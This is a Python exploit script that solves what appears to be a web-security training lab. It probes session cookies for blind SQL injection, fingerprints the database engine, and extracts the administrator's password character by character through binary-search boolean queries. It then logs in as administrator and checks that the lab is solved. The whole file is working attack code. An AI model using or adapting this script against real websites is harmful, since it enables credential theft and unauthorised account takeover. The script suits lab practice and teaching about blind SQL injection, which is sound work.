import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        self.target_cookie: Optional[str] = None
        self.db_engine: Optional[str] = None

    def _send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        cookies: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[Response]:
        """Handles all HTTP Communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                cookies=cookies,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxy,
                verify=False,
            )
        except RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

    def is_acitve(self):
        """Checks if the lab is active"""
        print("[*] Phase 1: Checking if lab is active...")
        res = self._send_request("")
        return res is not None and "academyLabBanner" in res.text

    def check_boolean(self, sql_condition) -> bool:
        """Injects a condition into target cookie and checks for 'Welcome back'"""
        if not self.target_cookie:
            return False

        for cookie in self.session.cookies:
            if cookie.name == self.target_cookie:
                # Backup the cookie value
                original_value = cookie.value
                # update with injection payload
                cookie.value = f"{original_value}'{sql_condition}"
                res = self._send_request("")
                # restore
                cookie.value = original_value
                return res is not None and "Welcome back!" in res.text
        return False

    def identify_vulnerable_cookie(self) -> Optional[str]:
        print("[*] Phase 2: Probing cookies for SQL injection vulnerability...")
        for cookie in self.session.cookies:
            original_value = cookie.value
            # True Test
            cookie.value = f"{original_value}' AND '1'='1"
            res_true = self._send_request("")
            # False Test
            cookie.value = f"{original_value}' AND '1'='2"
            res_false = self._send_request("")
            # Restore
            cookie.value = original_value
            if (
                res_true
                and "Welcome back!" in res_true.text
                and res_false
                and "Welcome back!" not in res_false.text
            ):
                print(f"[+] Identified vulnerable cookie: {cookie.name}")
                self.target_cookie = cookie.name
                return cookie.name
        return None

    def fingerprint_db(self) -> str:
        print("[*] Phase 2: Fingerprinting database engine...")
        # Oracle test
        if self.check_boolean(" AND (SELECT 'a' FROM DUAL)='a'-- "):
            self.db_engine = "ORACLE"
        # PostgreSQL test
        elif self.check_boolean(" AND (SELECT version()) LIKE '%PostgreSQL%'--"):
            self.db_engine = "POSTGRESQL"
        else:
            self.db_engine = "MSSQL_MYSQL"
        print(f"[+] Detected DB Engine: {self.db_engine}")
        return self.db_engine

    def get_field_length(self, subquery: str) -> int:
        """Finds the lengths of a query result using Binary Search"""
        print("[*] Phase 4: Determining length of column...")
        low = 1
        high = 100

        while low + 1 < high:
            mid = (high + low) // 2
            condition = f" AND ({subquery}) > {mid}-- "
            print(
                f"\r[!] Current Binary Search range: [{low}, {high}] -> {mid}", end=""
            )
            if self.check_boolean(condition):
                low = mid
            else:
                high = mid
        print()
        return high

    def find_data_string(self, data_len: int, subquery: str) -> str:
        """Finds the data string of a query result using Bianry Search"""
        print("[*] Phase 5: Detecting password string...")
        extracted_string = ""
        for pos in range(1, data_len + 1):
            low = 32  # smallest printable ascii
            high = 126  # highest printable ascii
            substr_query = subquery.replace("REPLACE", f"{pos}")
            while low < high - 1:
                mid = (high + low) // 2
                codition = f" AND ({substr_query}) > {mid}-- "
                if self.check_boolean(codition):
                    low = mid
                else:
                    high = mid
            extracted_string += chr(high)
            print(f"\r[!] Exctraced String: {extracted_string}", end="", flush=True)
        print()
        return extracted_string

    def probe_blind_query(self, select_col: str, table: str, where_clause: str) -> str:
        """Extract data character by character using binary search"""
        print(f"[*] Phase 3: Exfiltrating {select_col} from {table} table...")
        # Step 1: Determine the column length
        length_query = (
            f"SELECT LENGTH({select_col}) FROM {table} WHERE {where_clause} LIMIT 1"
        )
        if self.db_engine == "ORACLE":
            length_query = f"SELECT LENGTH({select_col}) FROM {table} WHERE {where_clause} AND ROWNUM = 1"

        data_len = self.get_field_length(length_query)
        print(f"[+] Identified length: {data_len}")

        # Step 2: Determine the character data using binary search over printable ascii range
        admin_pass = ""
        substr_query = f"SELECT ASCII(SUBSTRING({select_col}, REPLACE, 1)) FROM {table} WHERE {where_clause} LIMIT 1"
        if self.db_engine == "ORACLE":
            substr_query = f"SELECT ASCII(SUBSTR({select_col}, REPLACE, 1)) FROM {table} WHERE {where_clause} AND ROWNUM = 1"

        admin_pass = self.find_data_string(data_len, substr_query)
        return admin_pass

    def authenticate_and_verify(self, username: str, password: str) -> bool:
        """Authenticates and verify if lab reached solved state"""
        print(f"[*] Phase 6: Attempting to login as: {username}...")
        # Step 1: Extract the CSRF
        res = self._send_request("login")
        if res is None or res.status_code != 200:
            print("[-] Could not load login page!")
            return False
        soup = BeautifulSoup(res.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        csrf_token = str(csrf_tag.get("value")) if csrf_tag else None

        # Step 2: Login
        login_data = {"csrf": csrf_token, "username": username, "password": password}
        res = self._send_request("login", data=login_data, method="POST")

        # Step 3: Verify
        res = self._send_request("")
        return res is not None and "Congratulation" in res.text

    def solve(self) -> None:
        # Check if lab is active
        if not self.is_acitve():
            print("[-] Lab URL is not active or has expired!")
            return

        # Probe for vulnerable cookie
        if not self.identify_vulnerable_cookie():
            print("[-] Could not identify vulnerable tracking cookie!")
            return

        # Extract administrator password using lab specified information
        admin_pass = self.probe_blind_query(
            "password", "users", "username='administrator'"
        )

        # Login and verify
        if self.authenticate_and_verify("administrator", admin_pass):
            print("[!] SUCCESS: Logged and in and Lab solved")
        else:
            print("[-] Lab not solved!")
        pass


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
